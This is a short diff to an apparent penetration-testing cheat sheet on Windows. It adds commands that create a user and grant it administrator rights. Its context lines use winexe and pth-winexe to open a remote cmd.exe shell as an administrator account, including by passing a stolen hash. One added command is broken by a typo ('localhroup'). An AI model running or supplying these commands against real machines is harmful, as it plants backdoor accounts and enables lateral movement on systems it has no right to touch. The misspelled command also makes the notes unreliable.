@@ -1,5 +1,12 @@
 # Misc windows stuff
 
+Add admin user.
+
+```sh
+net user username password /add
+net localhroup administrators username /add
+```
+
 ```sh
 winexe - U jenkins/administrator //xxx.xxx.xxx cmd.exe
 pth-winexe -U jenkins/administrator //xxx.xxx.xxx.xxx cmd.exe
